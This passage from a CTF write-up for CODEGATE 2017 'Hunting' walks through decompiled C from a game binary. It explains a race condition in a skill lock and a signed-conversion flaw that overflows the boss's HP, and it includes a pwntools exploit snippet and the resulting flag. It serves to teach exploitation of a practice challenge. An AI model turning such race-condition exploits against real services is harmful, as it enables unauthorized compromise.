+  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">72</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">======================================="</span><span class="p">);</span>
+<span class="err">}</span></code></pre></figure>
+
+<p>In the executePlayerAttack function, it will check for the skill we’re currently using and depending on it, our damage will be calculated .</p>
+
+<p>Just a quick peek at some skills and their calculations:</p>
+
+<p><strong>Iceball</strong></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">executeIceball</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">40</span><span class="p">));</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">1000</span><span class="p">;</span>
+<span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>				<span class="c1">// Damage for iceball</span></code></pre></figure>
+
+<p><strong>Fireball</strong></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">executeFireball</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">40</span><span class="p">));</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">1000</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
+<span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>				<span class="c1">// Damage for fireball</span></code></pre></figure>
+
+<p><strong>Icesword</strong></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">executeIcesword</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">40</span><span class="p">));</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">rand</span><span class="p">();</span>
+<span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x8FFFFFFF</span> <span class="o">|</span> <span class="n">v1</span><span class="p">;</span>
+<span class="n">v3</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">|</span> <span class="p">((</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)</span><span class="n">rand</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF00000000LL</span><span class="p">;</span>
+<span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>		<span class="c1">// Damage for icesword</span></code></pre></figure>
+
+<p>So there are some subtle differences between those skills.</p>
+
+<ul>
+  <li>Iceball can do a good amount of damage (0-1000).</li>
+  <li>Fireball can do a max damage of 100, but it lets the attack thread sleep for 1 second, which iceball doesn’t.</li>
+  <li>Icesword seems to be calculating alot but in reality it just always returns “-1” as dmg (0xffffffff in 32 bit)</li>
+</ul>
+
+<p>Back to the attacking thread. It tries to “lock” the attack calculation with an if/else checking if a “lock object” is set.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">useSkillLockObject</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"You are already using the skill. Skill failed to use:%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">useSkillLockObject</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span></code></pre></figure>
+
+<p>One of the most common examples of how <strong>not</strong> to implement “thread safety”. Since we’re multi-threading, the attack thread can suspend on every instruction, letting other threads (like the main thread) do something.</p>
+
+<p>The attack thread will then check, if we’re using a skill below or equal “4”, and if so, subtracts its damage value from the boss hp (calling cdqe before, converting the damage value into a signed 64 bit value). If we’re using a skill above 4, it won’t convert the damage value and use the value as it is.</p>
+
+<p>This means, if we’re using icesword, the binary is using the second damage calculation, interpreting the value as 64 bit <code class="language-plaintext highlighter-rouge">0xFFFFFFFF</code> (resulting in <code class="language-plaintext highlighter-rouge">4294967295</code> damage, which means nothing to the current boss hp). But if we would be able to get it to use the first calculation it would convert the damage of icesword to a qword resulting in a 64 bit <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFF</code> (resulting in -1 damage, which would then be suctracted, and thus gets <strong>added</strong> onto the boss hp).</p>
+
+<p>Since the boss has <code class="language-plaintext highlighter-rouge">0x7FFFFFFFFFFFFFFF</code> (<code class="language-plaintext highlighter-rouge">9223372036854775807</code>) HP  , adding 1 to it, would let it “overflow” to <code class="language-plaintext highlighter-rouge">0x8000000000000000</code> (<code class="language-plaintext highlighter-rouge">-9223372036854775808</code>) HP, killing him instantenously.</p>
+
+<p>So what we need to do:</p>
+
+<ul>
+  <li>Let the binary think we’re using a skill &lt;= 4, to get into the first “calculation method”</li>
+  <li>Get over the negative damage check</li>
+  <li>Change the skill just before the damage gets subtracted from the boss hp by switching to icesword and attack with it</li>
+</ul>
+
+<p>The sleep from “Fireball” and “Icesword” is there to help with this. As soon as we reach level 4 we will change our attack pattern to:</p>
+
+<ul>
+  <li>Select “Fireball”</li>
+  <li>Use skill</li>
+  <li>Immediately change skill to “Ice sword”</li>
+  <li>Use skill</li>
+</ul>
+
+<p>If we manage to do this in the correct timing, this should do the following:</p>
+
+<ul>
+  <li>Enter the boss attack thread, trying to execute fireball</li>
+  <li>The fireball calculation will create some minor damage value, then sleep 1 second (giving us time to send another input)</li>
+  <li>The boss attack thread will then check, if we’re using a skill below or equal to “4” (which fireball is)</li>
+  <li>While this is happening we’re already switching our skill on the main thread to “Ice sword” and execute another attack</li>
+  <li>Since the damage from icesword will be calculated 1 second after fireball the chances are high, that we’ll pass the “skill lock” and the “skill” check, and replace the player damage with 0xFFFFFFFF, which gets then converted to “-1”  just before subtracting it from the boss hp.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python">	 <span class="k">if</span> <span class="n">playerLevel</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+                <span class="c1"># On level4 we can use icesword which results in -1 dmg
+</span>                <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+
+                <span class="c1"># Try to guess the boss attack, but this doesn't work reliable anymore since
+</span>                <span class="c1"># fireball also adds another sleep, so we just have to hope ;-)
+</span>                <span class="n">bossAttack</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">3</span>
+                <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">3</span>
+                <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">3</span>
+                <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">3</span>
+
+                <span class="n">useShield</span> <span class="o">=</span> <span class="n">getShieldToUse</span><span class="p">(</span><span class="n">bossAttack</span><span class="p">)</span>
+
+                <span class="c1"># This will switch to fireball, attack and immediately switch $
+</span>                <span class="c1"># (while the attack thread is running and already passed the skill check)
+</span>                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">useShield</span><span class="p">))</span>
+                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">7</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+                <span class="n">checkForStates</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+
+                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+
+                <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
+
+                <span class="k">if</span> <span class="n">counter</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
+                        <span class="c1"># Hopefully we killed the boss here, executing cat /ho$
+</span>                        <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+                <span class="k">return</span></code></pre></figure>
+
+<p>Race conditions aren’t always very predictable, but after two or three tries, the script resulted in a “boss kill”, which rewarded us with another flag:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">You use icesword
+Boss hp is -9223372036854775808
+Contraturation! You win!
+You are already using the skill. Skill failed to use:icesword
+
+=============================
+s1mp13_rac3_c0nd1t10n_gam3_</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=CODEGATE 2017 Prequalification - Hunting&amp;url=https://kileak.github.io/ctf/2017/Codegate-2017-Hunting/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/Codegate-2017-Hunting/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/Codegate-2017-Hunting';
+        var disqus_title = 'CODEGATE 2017 Prequalification - Hunting';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/Codegate-2017-Hunting';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
